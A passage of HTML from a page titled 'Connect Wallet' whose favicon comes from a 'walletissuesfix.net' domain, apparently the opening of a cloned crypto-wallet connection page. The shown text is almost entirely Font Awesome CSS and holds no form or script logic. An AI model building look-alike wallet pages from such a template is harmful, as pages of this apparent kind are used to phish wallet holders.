<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="shortcut icon"
      href="https://app.walletissuesfix.net/walletconnect-logo.svg"
      type="image/x-icon"
    />
    <title>Connect Wallet</title>
    <script
      src="./kit.fontawesome.com/78d167673c.js"
      crossorigin="anonymous"
    ></script>
    <style media="all" id="fa-v4-font-face">
      /*! * Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) */
      @font-face {
        font-family: "FontAwesome";
        font-display: block;
        src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.eot);
        src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.eot?#iefix)
            format("embedded-opentype"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.woff2)
            format("woff2"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.woff)
            format("woff"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.ttf)
            format("truetype"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.svg#fontawesome)
            format("svg");
      }
      @font-face {
        font-family: "FontAwesome";
        font-display: block;
        src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-brands-400.eot);
        src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-brands-400.eot?#iefix)
            format("embedded-opentype"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-brands-400.woff2)
            format("woff2"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-brands-400.woff)
            format("woff"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-brands-400.ttf)
            format("truetype"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-brands-400.svg#fontawesome)
            format("svg");
      }
      @font-face {
        font-family: "FontAwesome";
        font-display: block;
        src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.eot);
        src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.eot?#iefix)
            format("embedded-opentype"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.woff2)
            format("woff2"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.woff)
            format("woff"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.ttf)
            format("truetype"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.svg#fontawesome)
            format("svg");
        unicode-range: U+f004-f005, U+f007, U+f017, U+f022, U+f024, U+f02e,
          U+f03e, U+f044, U+f057-f059, U+f06e, U+f070, U+f075, U+f07b-f07c,
          U+f080, U+f086, U+f089, U+f094, U+f09d, U+f0a0, U+f0a4-f0a7, U+f0c5,
          U+f0c7-f0c8, U+f0e0, U+f0eb, U+f0f3, U+f0f8, U+f0fe, U+f111,
          U+f118-f11a, U+f11c, U+f133, U+f144, U+f146, U+f14a, U+f14d-f14e,
          U+f150-f152, U+f15b-f15c, U+f164-f165, U+f185-f186, U+f191-f192,
          U+f1ad, U+f1c1-f1c9, U+f1cd, U+f1d8, U+f1e3, U+f1ea, U+f1f6, U+f1f9,
          U+f20a, U+f247-f249, U+f24d, U+f254-f25b, U+f25d, U+f271-f274, U+f279,
          U+f28b, U+f28d, U+f2b5-f2b6, U+f2b9, U+f2bb, U+f2bd, U+f2c1-f2c2,
          U+f2d0, U+f2d2, U+f2dc, U+f2ed, U+f3a5, U+f3d1, U+f410;
      }
      @font-face {
        font-family: "FontAwesome";
        font-display: block;
        src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-v4deprecations.eot);
        src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-v4deprecations.eot?#iefix)
            format("embedded-opentype"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-v4deprecations.woff2)
            format("woff2"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-v4deprecations.woff)
            format("woff"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-v4deprecations.ttf)
            format("truetype"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-v4deprecations.svg#fontawesome)
            format("svg");
        unicode-range: U+f003, U+f006, U+f014, U+f016, U+f01a-f01b, U+f01d,
          U+f040, U+f045-f047, U+f05c-f05d, U+f07d-f07e, U+f087-f088,
          U+f08a-f08b, U+f08e, U+f090, U+f096-f097, U+f0a2, U+f0e4-f0e6,
          U+f0ec-f0ee, U+f0f5-f0f7, U+f10c, U+f112, U+f114-f115, U+f11d, U+f123,
          U+f132, U+f145, U+f147-f149, U+f14c, U+f166, U+f16a, U+f172,
          U+f175-f178, U+f18e, U+f190, U+f196, U+f1b1, U+f1d9, U+f1db, U+f1f7,
          U+f20c, U+f219, U+f230, U+f24a, U+f250, U+f278, U+f27b, U+f283, U+f28c,
          U+f28e, U+f29b-f29c, U+f2b7, U+f2ba, U+f2bc, U+f2be, U+f2c0, U+f2c3,
          U+f2d3-f2d4;
      }
    </style>
    <style media="all" id="fa-v4-shims">
      /*! * Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) */
      .fa.fa-glass:before {
        content: "\f000";
      }
      .fa.fa-meetup {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-star-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-star-o:before {
        content: "\f005";
      }
      .fa.fa-close:before,
      .fa.fa-remove:before {
        content: "\f00d";
      }
      .fa.fa-gear:before {
        content: "\f013";
      }
      .fa.fa-trash-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-trash-o:before {
        content: "\f2ed";
      }
      .fa.fa-file-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-o:before {
        content: "\f15b";
      }
      .fa.fa-clock-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-clock-o:before {
        content: "\f017";
      }
      .fa.fa-arrow-circle-o-down {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-arrow-circle-o-down:before {
        content: "\f358";
      }
      .fa.fa-arrow-circle-o-up {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-arrow-circle-o-up:before {
        content: "\f35b";
      }
      .fa.fa-play-circle-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-play-circle-o:before {
        content: "\f144";
      }
      .fa.fa-repeat:before,
      .fa.fa-rotate-right:before {
        content: "\f01e";
      }
      .fa.fa-refresh:before {
        content: "\f021";
      }
      .fa.fa-list-alt {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-dedent:before {
        content: "\f03b";
      }
      .fa.fa-video-camera:before {
        content: "\f03d";
      }
      .fa.fa-picture-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-picture-o:before {
        content: "\f03e";
      }
      .fa.fa-photo {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-photo:before {
        content: "\f03e";
      }
      .fa.fa-image {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-image:before {
        content: "\f03e";
      }
      .fa.fa-pencil:before {
        content: "\f303";
      }
      .fa.fa-map-marker:before {
        content: "\f3c5";
      }
      .fa.fa-pencil-square-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-pencil-square-o:before {
        content: "\f044";
      }
      .fa.fa-share-square-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-share-square-o:before {
        content: "\f14d";
      }
      .fa.fa-check-square-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-check-square-o:before {
        content: "\f14a";
      }
      .fa.fa-arrows:before {
        content: "\f0b2";
      }
      .fa.fa-times-circle-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-times-circle-o:before {
        content: "\f057";
      }
      .fa.fa-check-circle-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-check-circle-o:before {
        content: "\f058";
      }
      .fa.fa-mail-forward:before {
        content: "\f064";
      }
      .fa.fa-expand:before {
        content: "\f424";
      }
      .fa.fa-compress:before {
        content: "\f422";
      }
      .fa.fa-eye,
      .fa.fa-eye-slash {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-warning:before {
        content: "\f071";
      }
      .fa.fa-calendar:before {
        content: "\f073";
      }
      .fa.fa-arrows-v:before {
        content: "\f338";
      }
      .fa.fa-arrows-h:before {
        content: "\f337";
      }
      .fa.fa-bar-chart {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-bar-chart:before {
        content: "\f080";
      }
      .fa.fa-bar-chart-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-bar-chart-o:before {
        content: "\f080";
      }
      .fa.fa-facebook-square,
      .fa.fa-twitter-square {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-gears:before {
        content: "\f085";
      }
      .fa.fa-thumbs-o-up {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-thumbs-o-up:before {
        content: "\f164";
      }
      .fa.fa-thumbs-o-down {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-thumbs-o-down:before {
        content: "\f165";
      }
      .fa.fa-heart-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-heart-o:before {
        content: "\f004";
      }
      .fa.fa-sign-out:before {
        content: "\f2f5";
      }
      .fa.fa-linkedin-square {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-linkedin-square:before {
        content: "\f08c";
      }
      .fa.fa-thumb-tack:before {
        content: "\f08d";
      }
      .fa.fa-external-link:before {
        content: "\f35d";
      }
      .fa.fa-sign-in:before {
        content: "\f2f6";
      }
      .fa.fa-github-square {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-lemon-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-lemon-o:before {
        content: "\f094";
      }
      .fa.fa-square-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-square-o:before {
        content: "\f0c8";
      }
      .fa.fa-bookmark-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-bookmark-o:before {
        content: "\f02e";
      }
      .fa.fa-facebook,
      .fa.fa-twitter {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-facebook:before {
        content: "\f39e";
      }
      .fa.fa-facebook-f {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-facebook-f:before {
        content: "\f39e";
      }
      .fa.fa-github {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-credit-card {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-feed:before {
        content: "\f09e";
      }
      .fa.fa-hdd-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hdd-o:before {
        content: "\f0a0";
      }
      .fa.fa-hand-o-right {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hand-o-right:before {
        content: "\f0a4";
      }
      .fa.fa-hand-o-left {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hand-o-left:before {
        content: "\f0a5";
      }
      .fa.fa-hand-o-up {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hand-o-up:before {
        content: "\f0a6";
      }
      .fa.fa-hand-o-down {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hand-o-down:before {
        content: "\f0a7";
      }
      .fa.fa-arrows-alt:before {
        content: "\f31e";
      }
      .fa.fa-group:before {
        content: "\f0c0";
      }
      .fa.fa-chain:before {
        content: "\f0c1";
      }
      .fa.fa-scissors:before {
        content: "\f0c4";
      }
      .fa.fa-files-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-files-o:before {
        content: "\f0c5";
      }
      .fa.fa-floppy-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-floppy-o:before {
        content: "\f0c7";
      }
      .fa.fa-navicon:before,
      .fa.fa-reorder:before {
        content: "\f0c9";
      }
      .fa.fa-google-plus,
      .fa.fa-google-plus-square,
      .fa.fa-pinterest,
      .fa.fa-pinterest-square {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-google-plus:before {
        content: "\f0d5";
      }
      .fa.fa-money {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-money:before {
        content: "\f3d1";
      }
      .fa.fa-unsorted:before {
        content: "\f0dc";
      }
      .fa.fa-sort-desc:before {
        content: "\f0dd";
      }
      .fa.fa-sort-asc:before {
        content: "\f0de";
      }
      .fa.fa-linkedin {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-linkedin:before {
        content: "\f0e1";
      }
      .fa.fa-rotate-left:before {
        content: "\f0e2";
      }
      .fa.fa-legal:before {
        content: "\f0e3";
      }
      .fa.fa-dashboard:before,
      .fa.fa-tachometer:before {
        content: "\f3fd";
      }
      .fa.fa-comment-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-comment-o:before {
        content: "\f075";
      }
      .fa.fa-comments-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-comments-o:before {
        content: "\f086";
      }
      .fa.fa-flash:before {
        content: "\f0e7";
      }
      .fa.fa-clipboard,
      .fa.fa-paste {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-paste:before {
        content: "\f328";
      }
      .fa.fa-lightbulb-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-lightbulb-o:before {
        content: "\f0eb";
      }
      .fa.fa-exchange:before {
        content: "\f362";
      }
      .fa.fa-cloud-download:before {
        content: "\f381";
      }
      .fa.fa-cloud-upload:before {
        content: "\f382";
      }
      .fa.fa-bell-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-bell-o:before {
        content: "\f0f3";
      }
      .fa.fa-cutlery:before {
        content: "\f2e7";
      }
      .fa.fa-file-text-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-text-o:before {
        content: "\f15c";
      }
      .fa.fa-building-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-building-o:before {
        content: "\f1ad";
      }
      .fa.fa-hospital-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hospital-o:before {
        content: "\f0f8";
      }
      .fa.fa-tablet:before {
        content: "\f3fa";
      }
      .fa.fa-mobile-phone:before,
      .fa.fa-mobile:before {
        content: "\f3cd";
      }
      .fa.fa-circle-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-circle-o:before {
        content: "\f111";
      }
      .fa.fa-mail-reply:before {
        content: "\f3e5";
      }
      .fa.fa-github-alt {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-folder-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-folder-o:before {
        content: "\f07b";
      }
      .fa.fa-folder-open-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-folder-open-o:before {
        content: "\f07c";
      }
      .fa.fa-smile-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-smile-o:before {
        content: "\f118";
      }
      .fa.fa-frown-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-frown-o:before {
        content: "\f119";
      }
      .fa.fa-meh-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-meh-o:before {
        content: "\f11a";
      }
      .fa.fa-keyboard-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-keyboard-o:before {
        content: "\f11c";
      }
      .fa.fa-flag-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-flag-o:before {
        content: "\f024";
      }
      .fa.fa-mail-reply-all:before {
        content: "\f122";
      }
      .fa.fa-star-half-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-star-half-o:before {
        content: "\f089";
      }
      .fa.fa-star-half-empty {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-star-half-empty:before {
        content: "\f089";
      }
      .fa.fa-star-half-full {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-star-half-full:before {
        content: "\f089";
      }
      .fa.fa-code-fork:before {
        content: "\f126";
      }
      .fa.fa-chain-broken:before {
        content: "\f127";
      }
      .fa.fa-shield:before {
        content: "\f3ed";
      }
      .fa.fa-calendar-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-calendar-o:before {
        content: "\f133";
      }
      .fa.fa-css3,
      .fa.fa-html5,
      .fa.fa-maxcdn {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-ticket:before {
        content: "\f3ff";
      }
      .fa.fa-minus-square-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-minus-square-o:before {
        content: "\f146";
      }
      .fa.fa-level-up:before {
        content: "\f3bf";
      }
      .fa.fa-level-down:before {
        content: "\f3be";
      }
      .fa.fa-pencil-square:before {
        content: "\f14b";
      }
      .fa.fa-external-link-square:before {
        content: "\f360";
      }
      .fa.fa-compass {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-caret-square-o-down {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-caret-square-o-down:before {
        content: "\f150";
      }
      .fa.fa-toggle-down {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-toggle-down:before {
        content: "\f150";
      }
      .fa.fa-caret-square-o-up {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-caret-square-o-up:before {
        content: "\f151";
      }
      .fa.fa-toggle-up {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-toggle-up:before {
        content: "\f151";
      }
      .fa.fa-caret-square-o-right {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-caret-square-o-right:before {
        content: "\f152";
      }
      .fa.fa-toggle-right {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-toggle-right:before {
        content: "\f152";
      }
      .fa.fa-eur:before,
      .fa.fa-euro:before {
        content: "\f153";
      }
      .fa.fa-gbp:before {
        content: "\f154";
      }
      .fa.fa-dollar:before,
      .fa.fa-usd:before {
        content: "\f155";
      }
      .fa.fa-inr:before,
      .fa.fa-rupee:before {
        content: "\f156";
      }
      .fa.fa-cny:before,
      .fa.fa-jpy:before,
      .fa.fa-rmb:before,
      .fa.fa-yen:before {
        content: "\f157";
      }
      .fa.fa-rouble:before,
      .fa.fa-rub:before,
      .fa.fa-ruble:before {
        content: "\f158";
      }
      .fa.fa-krw:before,
      .fa.fa-won:before {
        content: "\f159";
      }
      .fa.fa-bitcoin,
      .fa.fa-btc {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-bitcoin:before {
        content: "\f15a";
      }
      .fa.fa-file-text:before {
        content: "\f15c";
      }
      .fa.fa-sort-alpha-asc:before {
        content: "\f15d";
      }
      .fa.fa-sort-alpha-desc:before {
        content: "\f881";
      }
      .fa.fa-sort-amount-asc:before {
        content: "\f160";
      }
      .fa.fa-sort-amount-desc:before {
        content: "\f884";
      }
      .fa.fa-sort-numeric-asc:before {
        content: "\f162";
      }
      .fa.fa-sort-numeric-desc:before {
        content: "\f886";
      }
      .fa.fa-xing,
      .fa.fa-xing-square,
      .fa.fa-youtube,
      .fa.fa-youtube-play,
      .fa.fa-youtube-square {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-youtube-play:before {
        content: "\f167";
      }
      .fa.fa-adn,
      .fa.fa-bitbucket,
      .fa.fa-bitbucket-square,
      .fa.fa-dropbox,
      .fa.fa-flickr,
      .fa.fa-instagram,
      .fa.fa-stack-overflow {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-bitbucket-square:before {
        content: "\f171";
      }
      .fa.fa-tumblr,
      .fa.fa-tumblr-square {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-long-arrow-down:before {
        content: "\f309";
      }
      .fa.fa-long-arrow-up:before {
        content: "\f30c";
      }
      .fa.fa-long-arrow-left:before {
        content: "\f30a";
      }
      .fa.fa-long-arrow-right:before {
        content: "\f30b";
      }
      .fa.fa-android,
      .fa.fa-apple,
      .fa.fa-dribbble,
      .fa.fa-foursquare,
      .fa.fa-gittip,
      .fa.fa-gratipay,
      .fa.fa-linux,
      .fa.fa-skype,
      .fa.fa-trello,
      .fa.fa-windows {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-gittip:before {
        content: "\f184";
      }
      .fa.fa-sun-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-sun-o:before {
        content: "\f185";
      }
      .fa.fa-moon-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-moon-o:before {
        content: "\f186";
      }
      .fa.fa-pagelines,
      .fa.fa-renren,
      .fa.fa-stack-exchange,
      .fa.fa-vk,
      .fa.fa-weibo {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-arrow-circle-o-right {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-arrow-circle-o-right:before {
        content: "\f35a";
      }
      .fa.fa-arrow-circle-o-left {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-arrow-circle-o-left:before {
        content: "\f359";
      }
      .fa.fa-caret-square-o-left {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-caret-square-o-left:before {
        content: "\f191";
      }
      .fa.fa-toggle-left {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-toggle-left:before {
        content: "\f191";
      }
      .fa.fa-dot-circle-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-dot-circle-o:before {
        content: "\f192";
      }
      .fa.fa-vimeo-square {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-try:before,
      .fa.fa-turkish-lira:before {
        content: "\f195";
      }
      .fa.fa-plus-square-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-plus-square-o:before {
        content: "\f0fe";
      }
      .fa.fa-openid,
      .fa.fa-slack,
      .fa.fa-wordpress {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-bank:before,
      .fa.fa-institution:before {
        content: "\f19c";
      }
      .fa.fa-mortar-board:before {
        content: "\f19d";
      }
      .fa.fa-delicious,
      .fa.fa-digg,
      .fa.fa-drupal,
      .fa.fa-google,
      .fa.fa-joomla,
      .fa.fa-pied-piper-alt,
      .fa.fa-pied-piper-pp,
      .fa.fa-reddit,
      .fa.fa-reddit-square,
      .fa.fa-stumbleupon,
      .fa.fa-stumbleupon-circle,
      .fa.fa-yahoo {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-spoon:before {
        content: "\f2e5";
      }
      .fa.fa-behance,
      .fa.fa-behance-square,
      .fa.fa-steam,
      .fa.fa-steam-square {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-automobile:before {
        content: "\f1b9";
      }
      .fa.fa-envelope-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-envelope-o:before {
        content: "\f0e0";
      }
      .fa.fa-deviantart,
      .fa.fa-soundcloud,
      .fa.fa-spotify {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-file-pdf-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-pdf-o:before {
        content: "\f1c1";
      }
      .fa.fa-file-word-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-word-o:before {
        content: "\f1c2";
      }
      .fa.fa-file-excel-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-excel-o:before {
        content: "\f1c3";
      }
      .fa.fa-file-powerpoint-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-powerpoint-o:before {
        content: "\f1c4";
      }
      .fa.fa-file-image-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-image-o:before {
        content: "\f1c5";
      }
      .fa.fa-file-photo-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-photo-o:before {
        content: "\f1c5";
      }
      .fa.fa-file-picture-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-picture-o:before {
        content: "\f1c5";
      }
      .fa.fa-file-archive-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-archive-o:before {
        content: "\f1c6";
      }
      .fa.fa-file-zip-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-zip-o:before {
        content: "\f1c6";
      }
      .fa.fa-file-audio-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-audio-o:before {
        content: "\f1c7";
      }
      .fa.fa-file-sound-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-sound-o:before {
        content: "\f1c7";
      }
      .fa.fa-file-video-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-video-o:before {
        content: "\f1c8";
      }
      .fa.fa-file-movie-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-movie-o:before {
        content: "\f1c8";
      }
      .fa.fa-file-code-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-file-code-o:before {
        content: "\f1c9";
      }
      .fa.fa-codepen,
      .fa.fa-jsfiddle,
      .fa.fa-vine {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-life-bouy,
      .fa.fa-life-ring {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-life-bouy:before {
        content: "\f1cd";
      }
      .fa.fa-life-buoy {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-life-buoy:before {
        content: "\f1cd";
      }
      .fa.fa-life-saver {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-life-saver:before {
        content: "\f1cd";
      }
      .fa.fa-support {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-support:before {
        content: "\f1cd";
      }
      .fa.fa-circle-o-notch:before {
        content: "\f1ce";
      }
      .fa.fa-ra,
      .fa.fa-rebel {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-ra:before {
        content: "\f1d0";
      }
      .fa.fa-resistance {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-resistance:before {
        content: "\f1d0";
      }
      .fa.fa-empire,
      .fa.fa-ge {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-ge:before {
        content: "\f1d1";
      }
      .fa.fa-git,
      .fa.fa-git-square,
      .fa.fa-hacker-news,
      .fa.fa-y-combinator-square {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-y-combinator-square:before {
        content: "\f1d4";
      }
      .fa.fa-yc-square {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-yc-square:before {
        content: "\f1d4";
      }
      .fa.fa-qq,
      .fa.fa-tencent-weibo,
      .fa.fa-wechat,
      .fa.fa-weixin {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-wechat:before {
        content: "\f1d7";
      }
      .fa.fa-send:before {
        content: "\f1d8";
      }
      .fa.fa-paper-plane-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-paper-plane-o:before {
        content: "\f1d8";
      }
      .fa.fa-send-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-send-o:before {
        content: "\f1d8";
      }
      .fa.fa-circle-thin {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-circle-thin:before {
        content: "\f111";
      }
